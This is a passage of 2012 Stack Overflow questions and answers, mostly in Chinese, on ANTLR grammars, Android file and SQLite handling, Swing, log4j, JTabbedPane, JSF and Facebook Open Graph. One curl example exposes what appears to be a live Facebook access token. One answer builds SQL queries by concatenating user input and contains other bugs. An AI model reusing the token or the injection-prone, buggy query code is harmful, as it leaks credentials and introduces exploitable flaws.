s=SIGN m=NUMBER v=VARIABLE e=exponent   { list = new java.util.ArrayList(); list.add($s.text); list.add($m.text); list.add($v.text); list.add($e.value); }
| s=SIGN m=NUMBER v=VARIABLE            { list = new java.util.ArrayList(); list.add($s.text); list.add($m.text); list.add($v.text); }
| s=SIGN v=VARIABLE e=exponent          { list = new java.util.ArrayList(); list.add($s.text); list.add("1");     list.add($v.text); list.add($e.value); }
| s=SIGN v=VARIABLE                     { list = new java.util.ArrayList(); list.add($s.text); list.add("1");     list.add($v.text); }
| s=SIGN m=NUMBER                       { list = new java.util.ArrayList(); list.add($s.text); list.add($m.text); }
;

exponent returns [int value]: ('^' n=INTEGER) { $value = 1; if ( $n != null && $n.text.length() > 0) $value = Integer.parseInt($n.text); }
;

VARIABLE    : ('a'..'z'|'A'..'Z')+
;

INTEGER : ('0'..'9')+
;

NUMBER  : ('0'..'9')+ (','('0'..'9')+)?
;

SIGN    :   ('+'|'-')
;

WS  :    (' ' | '\t' | '\r'| '\n')+ {skip();} 
; 
```

如果在 Java 中编译和使用此语法，它确实接受大多数输入值。显然，并非所有有效的输入值都被接受。一旦弹出不使用逗号的数字，例如输入

```
+42; 42; 42X^1337; 
```

抛出错误（来自输入“+42”的错误）：

```
line 1:1 no viable alternative at input '+' 
```

如果我将输入修改为

```
+42,0; 42,0; 42,0X^1337 
```

谁能说，为什么以及如何解决它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T11:24:07.217

最长匹配的第一个词法分析器规则获胜，因此`42`是 an `INTEGER`，`NUMBER`实际上仅在逗号部分存在时匹配，即当`NUMBER`匹配比 长时`INTEGER`。

这可以通过添加解析器规则来解决

```
number : NUMBER | INTEGER ; 
```

并使用它而不是`NUMBER`其他解析器规则。

# c# - 在 Telerik MVC TreeView 中显示选定元素

> ID：11736682
> 
> 赞同：0
> 
> 时间：2012-07-31T09:08:54.887
> 
> 标签：c#, javascript, treeview, telerik, telerik-mvc

这是我在 Telerik mvc 中创建树的代码。现在我想创建显示选定节点名称的弹出窗口。

```
Html.Telerik().TreeView()
    .Name("ZebTree")
    .ExpandAll(true)
    .ClientEvents(events => events.OnSelect("TreeView_onSelect"))
    .BindTo(Model , map =>
            {
                map.For<TreeViewBind.Models.Category>(bind => bind.ItemDataBound((item, category) => { item.Text = category.CategoryName; }).Children(category => category.Products));
                map.For<TreeViewBind.Models.Product>(bind => bind.ItemDataBound((item, product) => { item.Text = product.ProductName;}));
            }        
    ) 
```

这是javascript代码。

```
function TreeView_onSelect(e) 
    {
        var treeview = $(this).data('tTreeView');

        alert("You select the node " + ...);

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:52:23.980

获取节点的文本：

```
function TreeView_onSelect(e) 
{
  var treeview = $(this).data('tTreeView');
  var nodeText = treeview.getItemText(e.item);
  alert("You select the node: " + nodeText);
} 
```

问候

# java - 从文件夹中删除文件 - android

> ID：11736692
> 
> 赞同：3
> 
> 时间：2012-07-31T09:09:27.580
> 
> 标签：java, android

我有一个文件夹，其中包含一些我想在处理后删除的文件。这些文件具有扩展名`.FIR`经过一些谷歌搜索后，我发现了一个我修改了一下的递归方法：

```
void delete(File f) throws IOException {
      if (f.isDirectory()) {
        for (File c : f.listFiles())
            if(f.listFiles().toString().contains(".FIR"))
                delete(c);
      }
      if (!f.delete())
        throw new FileNotFoundException("Failed to delete file: " + f);
    } 
```

这个函数会抛出一个 IOException 告诉我：

```
07-31 11:02:31.885: E/DELETE:(5694): Failed to delete file: /mnt/sdcard/ExtractedFiles 
```

该文件夹已设置为`RW`操作。在我的清单文件中：

```
 <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> 
```

我找不到另一个听起来像的权限`MODIFY_FILES`

有任何想法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-31T09:26:07.270

尝试这个：

```
void delete(File f) throws IOException {
    if (f.isDirectory()) {
        for (File c : f.listFiles()) {
            delete(c);
        }
    } else if (f.getAbsolutePath().endsWith("FIR")) {
        if (!f.delete()) {
            new FileNotFoundException("Failed to delete file: " + f);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-31T09:14:52.090

Better use `temp` files....

`File f = File.createTempFile("pattern", ".suffix");`

Once the application is closed, the **temp files are first closed then deleted.**

See this link for more details:

[http://www.roseindia.net/java/example/java/io/create-temp-file.shtml](http://www.roseindia.net/java/example/java/io/create-temp-file.shtml)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-31T09:15:05.893

我认为问题出在这里：

```
if(f.listFiles().toString().contains(".FIR")) 
```

将其更改为：

```
if(c.getName().contains(".FIR")) 
```

并确保您的目录仅包含扩展名为**.FIR**的文件，否则（如果任何其他扩展文件可用）它仍然无法删除非空目录

* * *

否则使用以下方法完成：

```
private static boolean delete(File dir) {
    if (dir != null && dir.isDirectory()) {
        String[] children = dir.list();
        for (int i = 0; i < children.length; i++) {
            boolean success = delete(new File(dir, children[i]));
            if (!success) {
                return false;
            }
        }
    }
    return (dir.getName().contains(".FIR"))? dir.delete() : false;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T09:13:06.190

check this

`<uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-06-17T01:50:27.467

我正在使用此代码并且它正在工作：

```
 String root_sd = Environment.getExternalStorageDirectory().toString();
 File file = new File(path) ;       
  File list[] = file.listFiles();
    for(File f:list)
      {
     name =  file.getName();
    filestv.setText(f.getName());
    //add new files name in the list
   //  delete.setText(name );

      }  

} 
```

你可以按照完整的[教程](http://programondaspot.blogspot.com/2015/06/delete-latest-file-from-any-specific.html)

# java - JoptionPane 验证

> ID：11736695
> 
> 赞同：2
> 
> 时间：2012-07-31T09:09:41.303
> 
> 标签：java, swing, joptionpane

我有一个 Swing GUI，我在其中限制用户注册，以便用户名和密码不能相同。我正在使用`JoptionPane`以下代码执行任务：

```
public void actionPerformed(ActionEvent e) {
String username = tuser.getText();
String password1 = pass1.getText();
String password2 = pass2.getText();
String workclass = wclass.getText();
Connection conn = null;

try {
    if(username.equalsIgnoreCase(password1)) {
       JOptionPane.showMessageDialog(null,
           "Username and Password Cannot be the same. Click OK to Continue",
           "Error", JOptionPane.ERROR_MESSAGE); 
       System.exit(0);
    }
... 
```

问题是我必须使用`System.exit(0)`; 没有它，下一个代码将被执行。即使在`JOptionPane`弹出后，注册也成功了。我不需要系统退出，但我需要在验证后将用户保留在注册页面上。做这个的最好方式是什么？有没有其他方便的方法来做到这一点，而不是使用`JOptionPane`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:12:49.840

Replace

```
System.exit(0); 
```

with

```
return; 
```

if you do not want the rest of the method to be performed

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T09:13:59.093

You need to place your code within endless loop, and break it upon successful result. Something like:

```
while(true)
{
    // get input from user

    if(vlaidInput) break;
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-31T09:26:29.083

将下一个代码放入其他部分可能有效

```
if(username.equalsIgnoreCase(password1))
{
   JOptionPane.showMessageDialog(null, "Username and Password Cannot be the   same. Click OK to Continue","Error",JOptionPane.ERROR_MESSAGE); 

}
else 
{
  //place that next code
  // username and password not equals, then it will execute the code
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-07-31T09:57:52.373

首先，最好将 UI 和业务逻辑（在本例中为验证）分开。让他们单独提出一种更好的方式来单独处理交互。`UserValidation`因此，使用方法创建一个单独的类是有意义的`boolean isValid()`。像这样的东西：

```
public class UserValidation {
    private final String name;
    private final String passwd;
    private final String passwdRpt;

    public UserValidation(final String name, final String passwd, final String passwdRpt) {
        this.name = name;
        this.passwd = passwd;
        this.passwdRpt = passwdRpt;
    }

    public boolean isValid() {
       // do your validation logic and return true if successful, or false otherwise
    }
} 
```

然后操作代码将如下所示：

```
public void actionPerformed(ActionEvent e) {
        if (new UserValidation(tuser.getText(), pass1.getText(), pass2.getText()).isValid()) {
           // do everything needed is validation passes, which should include closing of the frame of dialog used for entering credentials.
        }

        // else update the UI with appropriate error message -- the dialog would not close by itself and would keep prompting user for a valid entry
} 
```

建议的方法为您提供了一种轻松对验证逻辑进行单元测试并在不同情况下使用它的方法。另请注意，如果方法`isValid()`中的逻辑过于繁重，则应由`SwingWorker`. 的调用`SwingWorker`是动作（即 UI）逻辑的职责。

# java - log4j.properties（没有这样的文件或目录）

> ID：11736696
> 
> 赞同：0
> 
> 时间：2012-07-31T09:09:44.487
> 
> 标签：java, maven, log4j

我正在使用 maven 和 log4j，但应用程序无法加载我的 WAR 文件中“/”和“/WEB-INF/classes/”中的 log4j.properties。

在我的 Java 代码中：

```
try {
    Properties props = new Properties();
    props.load(new FileInputStream("log4j.properties"));
    PropertyConfigurator.configure(props);
} catch (Exception e) {
    ...
} 
```

我的 pom.xml 中是否需要额外的配置？（除了依赖）

先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:12:12.417

Try to use

```
 InputStream is = this.getClass().getClassLoader().getResourceAsStream("log4j.properties"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:28:07.440

你也可以试试这个：

```
PropertyConfigurator.configure(getClass().getResource("/<path if any>/log4j.properties")); 
```

# android - 从数据库中检查名称

> ID：11736706
> 
> 赞同：0
> 
> 时间：2012-07-31T09:10:34.370
> 
> 标签：android, database, android-widget, database-connection, relational-database

又是我，大卫。我只是想知道我的代码是否正确。我试图弄清楚数据库（**Database_Handler.java**）是否可以检查名为**label_input的***EditText*。如果它已经存在于数据库中，则取消注册。但是，我的问题是，即使没有错误，条件也会忽略并自动跳转到*else*语句。希望你能帮助我，并提前感谢。

 ***这是我的代码（**Database_Handler.java**）：

```
//Variables
private Button add_button, proceed_to_player_spinner_menu;
private EditText label_input;
//private SQLiteDatabase datab;

//Response
public final static String EXTRA_MESSAGE_1 = "com.example.databasetestvertwo.MESSAGE1";
public final static String EXTRA_MESSAGE_2 = "com.example.databasetestvertwo.MESSAGE2";
public final static String EXTRA_MESSAGE_3 = "com.example.databasetestvertwo.MESSAGE3";

@Override
public void onCreate(Bundle savedInstanceState)
{

    super.onCreate(savedInstanceState);

    setContentView(R.layout.register_menu);

    //Setting for the players' list.
    add_button = (Button) findViewById(R.id.register_name);
    proceed_to_player_spinner_menu = (Button) findViewById(R.id.Proceed_Button_to_Spinner);
    label_input = (EditText) findViewById(R.id.Name_of_Player_Text_Box);

    //Function for Buttons to be add as a new player's name.
    add_button.setOnClickListener(new OnClickListener() 
    {

        public void onClick(View v) 
        {

            String label = label_input.getText().toString();

            //Here's the process on how to register in the database.
            if(label.trim().length() > 0)
            {
                //Database Handler from Class (Database_Handler.java)
                Database_Handler db = new Database_Handler(getApplicationContext());

                //Inserting new label into the database.
                //db.insertLabel(label);

                if(db.getAllLabels().toArray().toString().equals(label))
                {
                    Toast.makeText(getApplicationContext(), "Name existed.", Toast.LENGTH_SHORT).show();
                }
                else
                {
                    Toast.makeText(getApplicationContext(), "Name available!", Toast.LENGTH_SHORT).show();
                }

                //Message Confirmation
                //Toast.makeText(getApplicationContext(), "Player name " + label + " have been confirmed!", Toast.LENGTH_SHORT).show();

                //After typing, the text field is set to blank.
                //label_input.setText("");

                //Normally, most smartphones and tablets only have a virtual keyboard.
                InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
                imm.hideSoftInputFromWindow(label_input.getWindowToken(), 0);

                //loadSpinnerData();
            }

            else //If the input is null...
            {
                Toast.makeText(getApplicationContext(), "Please enter your name.", Toast.LENGTH_SHORT).show();
            }

        }

    });

    proceed_to_player_spinner_menu.setOnClickListener(new OnClickListener() 
    {

        public void onClick(View v) 
        {

            startActivity(new Intent(from_3_players.this, Player_at_3_Spinner_Menu.class));

        }

    });

} 
```

...以及**Database_Handler.java的代码**

```
//Main Variables for the Database Handler
private static final int DATABASE_VERSION = 1; //Version of the Database
private static final String DATABASE_NAME = "spinnerExample"; //Name of the Database
public static final String TABLE_LABELS = "labels"; // Table Name

//Columns for the Database
public static final String KEY_ID = "id";
private static final String KEY_NAME = "name";

public Database_Handler(Context context)
{
    super(context, DATABASE_NAME, null, DATABASE_VERSION);
}

@Override
public void onCreate(SQLiteDatabase db) //Used for creating a table. 
{

    //Create Table Query Category 
    /*
     * 
     * 
     *      WARNING! Under CREATE_CATEGORIES_TABLE, strictly type the exact words on
     *      all 4 values with quotations, even the space. Exception only is the name
     *      from the variable names under "private static final String" here.  
     * 
     * 
     */
    String CREATE_CATEGORIES_TABLE = "CREATE TABLE " + TABLE_LABELS + "(" + KEY_ID +
            " INTEGER PRIMARY KEY," + KEY_NAME + " TEXT)";

    db.execSQL(CREATE_CATEGORIES_TABLE); //Executes the query.

}

@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) //Updates the info.
{

    //Drops the old existing table.
    db.execSQL("DROP TABLE IF EXISTS " + TABLE_LABELS);

    //Creates table again.
    onCreate(db);

}

/*
 * 
 *             The next section will create a new label into the tables.
 *          This allows the database to harvest the identifier for each
 *          column. And, the database must set a list of person so that
 *          it applies in an infinite number of registration.  
 * 
 */

//Inserts a new label into the table.
public void insertLabel(String label)
{

    SQLiteDatabase db = this.getWritableDatabase();
    ContentValues values = new ContentValues();
    values.put(KEY_NAME, label);

    //Inserting Row
    db.insert(TABLE_LABELS, null, values);
    db.close(); //Always close the database to prevent running dynamically. It has a pause to process one at a time.

}

//Returns all labels stored in the database.
public List<String> getAllLabels()
{

    List<String> labels = new ArrayList<String>(); //This must be return.

    //Select all Query it have.
    String selectQuery = "SELECT * FROM " + TABLE_LABELS;

    SQLiteDatabase db = this.getReadableDatabase();
    Cursor cursor = db.rawQuery(selectQuery, null);

    //Do the loop by rows to add new in the database
    if(cursor.moveToFirst())
    {
        do
        {
            labels.add(cursor.getString(1));
        }

        while(cursor.moveToNext());
    }

    //Always close the connections.
    cursor.close();
    db.close();

    //Return the labels for feedback and response. the "return" keyword can be like a value set for process.
    return labels;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:54:19.000

您试图将数组与您的标签进行比较。

db.getAllLabels().toArray().toString() 在这里，您从数据库中获取名称列表作为 list(List)，然后使用 toArray() 将此列表转换为 Array。然后你使用 toString() 将此数组转换为字符串，这将返回类似**java.lang.Object;..**的字符串，所以这不是数据库中的任何名称。

因此必须编写另一种方法来比较给定名称与从数据库中检索到的项目列表。例如。

```
if (isNameExists(label)) {
     //show positive Toast  
} else {
    //show negative Toast
} 
```

// 方法 isNameExists() 如下

```
private boolean isNameExists(String name) {
    Database_Handler db = new Database_Handler(getApplicationContext());

    List<String> nameList = db.getAllLabels();

    for(String nameInDB : nameList) {
         if (nameInDB.equals(name)
             return true;
    }

    return false;

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T10:07:58.170

```
 public class Database {
    private static final String TAG = "DbAdapter";

    private DatabaseHelper mDbHelper;
    private SQLiteDatabase mDb;

    public static final String TABLE_COMMENTS = "tablename";
    public static final String COLUMN_ID = "_id";
    public static final String COLUMN_COMMENT = "comment";

    private static final String DATABASE_NAME = "databasename";
    private static final int DATABASE_VERSION = 1;

    private final Context mCtx;

    private static class DatabaseHelper  extends SQLiteOpenHelper 
    {

        // Database creation sql statement
        private static final String DATABASE_CREATE = "CREATE  TABLE tablename (id INTEGER PRIMARY KEY  AUTOINCREMENT  NOT NULL , column1 INTEGER, column2 TEXT, column3 TEXT, column4 TEXT, column5 TEXT, column6 NUMERIC)";

        public DatabaseHelper(Context context) {
            super(context, DATABASE_NAME, null, DATABASE_VERSION);
        }

        @Override
        public void onCreate(SQLiteDatabase database) {
            database.execSQL(DATABASE_CREATE);
        }

        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            Log.w(DatabaseHelper.class.getName(),
                    "Upgrading database from version " + oldVersion + " to "
                            + newVersion + ", which will destroy all old data");
            db.execSQL("DROP TABLE IF EXISTS " + TABLE_COMMENTS);
            onCreate(db);
        }

    }

    public Database(Context c)
    {
        this.mCtx = c;
    }

    public void open() throws SQLException {
        mDbHelper = new DatabaseHelper(mCtx);
        mDb = mDbHelper.getWritableDatabase();
    }

    public void close() {
        mDbHelper.close();
    }

    public void inset(ContentValues cv) 
    {
        mDb.insert(TABLE_COMMENTS, null, cv);
    }

    public Cursor getdata()
    {
        Cursor c = mDb.rawQuery("SELECT * FROM tablename", null);
        return c;
    }

    public Cursor getById(int index)
    {
        Cursor c = mDb.rawQuery("SELECT * FROM tablename where field ="+index, null);
        return c;
    }
    public void deletedata(int index)
    {
        mDb.rawQuery("delete from tablename where id ="+index, null);

    }
public boolean checkRegistration(String name)
        {

            Cursor c = mDb.rawQuery("SELECT * FROM tablename where column name= "+name, null);
                    int count = c.getCount;
                    c.close();
            if(count > 0)
                    {
                       return false;
                    }
                    else
                    {
                       return true;
                    }
     }

}

Database db =new Database(this);
db.open();
if(db.checkRegistration(str))
{
   //please register this user.
}
else
{
   //this user already register
}
db.close(); 
```***

# android - 从哈希图中获取字符串

> ID：11736707
> 
> 赞同：0
> 
> 时间：2012-07-31T09:10:35.347
> 
> 标签：android

我认为我有一个非常简单的问题，但无法弄清楚。

我希望能够从 Hashmap 中取出一些东西，但不能让它工作。

这是代码：

```
try{

        JSONArray  deelnemers = json.getJSONArray("deelnemers");

        int Key = getIntent().getIntExtra("Key", -1);

            { HashMap<String, String> map = new HashMap<String, String>();  
            JSONObject e = deelnemers.getJSONObject(Key);

            map.put("id",  String.valueOf(Key));
            map.put("name", "Naam: " +  e.getString("naamingw2"));
            map.put("sex", "Geslacht: " +  e.getString("geslacht"));
            map.put("rank", "Rang: " +  e.getString("rang"));
            map.put("picture", "http://www.de-saksen.nl/2/images/comprofiler/" + e.getString("avatar"));
            mylist.add(map);            
        }   
            String URL = new String (mylist.get("picture"));
            WebView WV = (WebView) findViewById(R.id.webView1);              
            WV.loadUrl(URL); 
```

我在 (mylist.get("picture")); 处收到编译器错误；

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:12:29.320

我可能遗漏了一些东西，但您的 HashMap 的名称是“map”，而不是“mylist”。

编辑：如果 mylist 表示包含您的 HashMap 的列表，那么您可以执行以下操作：

```
mylist.get(0).get("picture"); 
```

# java - 给 JTabbedPane 订单

> ID：11736708
> 
> 赞同：3
> 
> 时间：2012-07-31T09:10:39.003
> 
> 标签：java, swing, jtabbedpane

我最近遇到了索引标签的问题，尽管我会使用该`setComponentAt`方法对其进行一些具体的排序。这是我的代码：

```
public ContainerPane() {
    this.setLayout(new BorderLayout());
    myPlayerManagerPane = new PlayerManagerPane();
    myGameManagerPane = new GameManagerPane();
    myCharacterManagerPane = new CharacterManagerPane();

    myPaneTab = new JTabbedPane(JTabbedPane.TOP);
    myPaneTab.addTab("Character",myCharacterManagerPane);
    myPaneTab.addTab("Player",myPlayerManagerPane);
    myPaneTab.addTab("Games",myGameManagerPane);
    System.out.println(myPaneTab.getTabCount());
    //myPaneTab.setEnabledAt(1, false);
    //myPaneTab.setEnabledAt(2, false);
    myPaneTab.setComponentAt(0, myPlayerManagerPane);
    myPaneTab.setMnemonicAt(0, KeyEvent.VK_1);
    myPaneTab.setComponentAt(1, myCharacterManagerPane);
    myPaneTab.setMnemonicAt(1, KeyEvent.VK_2);
    myPaneTab.setComponentAt(2, myGameManagerPane);<---outOfBoundsException
    myPaneTab.setMnemonicAt(2, KeyEvent.VK_3);
    add(myPaneTab);
} 
```

因此，对于我拥有的计数，3 个选项卡（根据我的说法和`getTabCount()`），我从 0 开始计数（正确吗？）。我将最后一个索引设置为我拥有的最后一个组件。但我仍然有这个印刷要筛选：

```
3 <---from tabCount
Exception in thread "AWT-EventQueue-0" java.lang.ArrayIndexOutOfBoundsException: 2 >= 2 
```

我在哪里绊倒了，有没有更简单的方法来订购我的窗格？

编辑：注释掉`setComponent`方法，并放入一个 for 循环我得到这个输出：

> 有3个标签！
> 0 的标签是角色
> 1 的标签是玩家
> 2 的标签是游戏

并且一次取消注释一对方法，我只得到两个，一个是我没有覆盖的，一个是我现在设置的。

是否`setComponentAt`删除重复项？我的设置是否应该少于 3 个选项卡？JTabbedPanel 是否对重复窗格有奇怪的行为？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:44:46.153

由于您尝试进行更改，您会收到错误 - 通过将一些窗格放置到另一个位置，您会自动**删除**另一个选项卡。这就是您收到错误的原因 - 在某些更改之后只有不到 3 个选项卡（您可以在每次“setComponentAt”操作后检查输出选项卡的数量）。

简单地删除您想要重新排序的所有选项卡并使用**addTab**或**insertTab 读取它们**- 这将完成工作而不会出现任何错误。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T09:44:09.640

查看源代码，`setComponentAt`您可以看到您正在设置的组件已被删除：

```
 int count = getComponentCount();
                Component children[] = getComponents();
                for (int i = 0; i < count; i++) {
                    if (children[i] == page.component) {
                        super.remove(i);
                    }
                } 
```

接下来将此组件设置为页面的组件（覆盖该页面上的最后一个组件）：

```
 page.component = component; 
```

因此，设置现有选项卡组件的顺序最终会得到 2 个选项卡。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T09:42:13.657

我不确定 setComponentAt 如何或为什么不起作用，尽管可能是选项卡使用 Vector 并且我听说它们很糟糕。

如果你想有一个固定的添加顺序，只需使用`insertTab`Like 这样：

```
myPaneTab.insertTab("Games",null, myGameManagerPane,"CharacterManagerPane",2); 
```

其中 null 用于图标，并且不接受它作为空参数。

这样您就可以在源代码中知道选项卡的索引。唯一的问题是您无法在当前 tabCount 之后的索引处添加新选项卡（您可以通过 找到`getTabCount`），即您的选项卡无法计算 1、3、4！

我相信你可以编写一个新的 JTabb 类，并重载该`insertTab`方法以做一些更有帮助的事情，但它可能会混淆选项卡的位置（即，你可以告诉它把选项卡放在索引 2 并进入索引 1。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T09:33:41.017

如果您希望标签以其他顺序排列，请以其他顺序添加它们：

```
myPaneTab = new JTabbedPane(JTabbedPane.TOP);
myPaneTab.addTab("Player",myPlayerManagerPane);
myPaneTab.addTab("Character",myCharacterManagerPane);
myPaneTab.addTab("Games",myGameManagerPane); 
```

等等瞧。

# button - 如何用 div 替换 h:commandButton

> ID：11736709
> 
> 赞同：0
> 
> 时间：2012-07-31T09:10:46.617
> 
> 标签：button, html, submit, commandlink

我想用**div**替换我页面上的所有类型的按钮，如下所示：

```
<div class="button">
    <div class="button_left"></div>
    <div class="button_center">save</div>
    <div class="button_right"></div>
</div> 
```

我将组件替换到**h:commandLink**上，它可以与大多数组件一起使用，除了这样的组件：

```
<h:form>
    <h:commandButton value="do it" action="#{myBean.myFirstAction()}" />
    <h:commandButton value="do that" action="#{myBean.mySecondAction()}" />
</h:form> 
```

如何处理？

[编辑]：**a4j:commandButton**是一个运行良好的组件示例。这些组件之间的区别在于**h:commandButton**生成**input type="submit"**，其余生成**input type="button"**。

# android - 如何检查屏幕锁定是否有密码？

> ID：11736713
> 
> 赞同：1
> 
> 时间：2012-07-31T09:11:04.067
> 
> 标签：android

我目前正在检查是否有屏幕锁定密码：

DevicePolicyManager.getgetPasswordMinimumLength() != 0

因此，如果我看到长度为 0，我断定没有屏幕锁定密码，并提示用户设置一个`DevicePolicyManager.ACTION_SET_NEW_PASSWORD`。

我想知道这是否是检查是否设置了屏幕锁定密码的正确方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:27:45.370

使用[DevicePolicyManager.isActivePasswordSufficient](http://developer.android.com/reference/android/app/admin/DevicePolicyManager.html#isActivePasswordSufficient%28%29)代替 getPasswordMinimumlength 检查您的密码策略是否足够

# ruby - 为什么捆绑安装（使用 capistrano 时）为 gems 创建 capistrano 文件夹？

> ID：11736715
> 
> 赞同：0
> 
> 时间：2012-07-31T09:11:21.343
> 
> 标签：ruby, ruby-on-rails-3, rubygems, capistrano, bundler

我对 capistrano 和 bundler 一起工作完全迷失了。我刚刚开始使用 capistrano 进行部署，当我尝试在本地开发机器上运行“bundle install”时，bundler 实际上正在创建一个“capistrano”文件夹并在那里安装 gem。理想情况下，在确定我的项目之前，“捆绑安装”只会拿起系统宝石并像魅力一样工作。

这一直困扰着我一段时间，我想了解为什么会发生这种情况，以及如何防止它（至少在我的本地开发机器上）。我知道这在生产服务器上实际执行“上限部署”时可能很有用，但为什么在开发中？

帮助..指出正确的方向有人请..

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:15:08.847

我确定你正在这样做

```
bundle install capistrano 
```

只是，

```
bundle install 
```

如果您在 Gemfile 中包含 capistrano 就足够了

# java - 如何为 Robot.getPixelColor(x, y) 方法获得更大区域的像素？

> ID：11736718
> 
> 赞同：0
> 
> 时间：2012-07-31T09:11:27.833
> 
> 标签：java

我当前粘贴在下面的代码显然只会获取像素（x，y）`1,1`， 等等的颜色，直到它找到具有相同 RGB 值的颜色，`2, 2`并且如果它没有在像素处找到匹配停止。有什么更好的方法可以做到这一点，所以我不仅得到了像素坐标的颜色，等等。?`3,3``targetColor``1000,1000``1,1``2,2`

AND我需要使用`getPixelColor(x, y)`方法，因为我需要颜色的坐标，所以我可以点击颜色位置。

```
import java.awt.Color;
import java.awt.Robot;

public class Colour
{
    int    x, y;
    int    n    = 0;
    int    m    = 0;
    int    i    = 0;

    public Colour()
    {
        try
        {
            Robot robot = new Robot();
            Color targetColor = new Color(255, 25, 255);
            Color color = robot.getPixelColor(n, n);

            while (color.getRGB() != targetColor.getRGB() && i != 1000)
            {
                color = robot.getPixelColor(n, n);
                System.out.println("color = " + color);
                n++;
                i++;

                if (color.getRGB() == targetColor.getRGB())
                {
                    i = 1000;
                    System.out.println("colour found" + n + " " + n);
                }
            }
        }
        catch (Exception e)
        {
        }
    }

    public static void main(String[] args)
    {
        Colour color = new Colour();
    }
} 
```

如果我不清楚我问的内容，请直说，我会尝试更深入或更易于理解的方式进行解释。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T10:03:23.460

要访问从 (0,0) 到 (1000,1000) 的所有像素，请尝试使用：

```
for(int i=0;i<=1000;i++){
    for(int j=0;j<=1000;j++){
        color = robot.getPixelColor(i, j);
        System.out.println("color = " + color);

        if(color.getRGB() == targetColor.getRGB()){
            System.out.println("colour found" + i + " " + j);
            i=1000;
            break;
        }
    }
} 
```

用这个替换while循环，你应该没问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:15:32.037

[您可能应该使用Robot.createScreenCapture(Rectangle screenRect)](http://docs.oracle.com/javase/1.4.2/docs/api/java/awt/Robot.html#createScreenCapture%28java.awt.Rectangle%29)一次捕获更大的区域。

这将返回一个`BufferedImage`，因此您可以使用任何常规技术来分析 BufferedImage 中的特定像素。BufferedImage 基本上是图像的内存表示形式，是通过代码检查和操作的一种方便形式。

如果您同时进行大量处理，则将 BufferedImage 转换为 ARGB 值的 int[] 数组是有意义的。

# facebook - facebook打开图：自定义对象提交错误

> ID：11736722
> 
> 赞同：0
> 
> 时间：2012-07-31T09:11:32.467
> 
> 标签：facebook, facebook-opengraph

当我使用以下内容向 FB 发布操作时

```
curl -F 'access_token=AAAFxEPEoxQgBAGCUyzmyKGDJLoKe2uz1I823Uf8CUBfMagfrqvkRgNcif2ipJGDeNZBc9JBao1xB2pulEggmLF4wFC3HU8wqkWZAc3zAZDZD' \
 -F 'topic=http://myurl.com/467564296596508' \
    'https://graph.facebook.com/me/customapp:custom' 
```

我明白了

```
Object at URL http://myurl.com/467564296596508 has og:type of 'website'. The property 'topic' requires an object of og:type 'customapp:custom'. 
```

[http://myurl.com/467564296596508](http://myurl.com/467564296596508)的源代码

```
<html>
<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# customapp: http://ogp.me/ns/fb/customapp#">
    <title>Content Title</title>
    <meta property="og:title" content="Content Title" />
    <meta property="og:image" content="http://myurl.com/img_default.png" />
    <meta property="og:description" content="Custom App Heading" />
    <meta property="fb:app_id" content="405792556107016" />
    <meta property="og:url" content="http://myurl.com/467564296596508" />
    <meta property="og:type" content="customapp:custom" />

</head>
<body>
</html> 
```

如何消除此错误？

问候阿杰

# loadrunner - 我们可以在 Loadrunner 中支持 sha256 密钥吗？如果可以的话怎么办？

> ID：11736737
> 
> 赞同：0
> 
> 时间：2012-07-31T09:12:05.460
> 
> 标签：loadrunner

**我们可以在 Loadrunner 中支持 sha256 密钥吗？如果可以的话？** 我正在使用 LR 9.52。我有一个 SHA256 的脚本，**但没有**密钥。我期待类似于我们在 Perl 中的“使用 Digest::SHA qw(hmac_sha256_base64); my $digest = hmac_sha256_base64 ($request, $self->{SecretKey});”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-11T07:26:58.027

我为 LoadRunner 编写了一个 SHA-1。

您可以在 [http://ptfrontline.wordpress.com/2010/03/02/sha-1-hash-for-loadrunner/找到它](http://ptfrontline.wordpress.com/2010/03/02/sha-1-hash-for-loadrunner/)

# c# - oledb、visual fox pro 和 c#

> ID：11736743
> 
> 赞同：0
> 
> 时间：2012-07-31T09:12:24.930
> 
> 标签：c#, oledb, visual-foxpro

我有数千行的视觉狐狸专业数据库。我正在使用 oledb 从 fox pro 获取数据并将其导出（在进行一些计算和格式化之后）到 sql server。我使用数据集一次填充 2-3 个数据表（相关表）。

第一个问题是内存使用非常高，因为数据集很大。我想减少内存占用。对此有任何建议。

所以我决定一次获取几行。如何使用 oledb 命令获取行，以便我可以获取例如 1-20 和 20-40 等

* * *

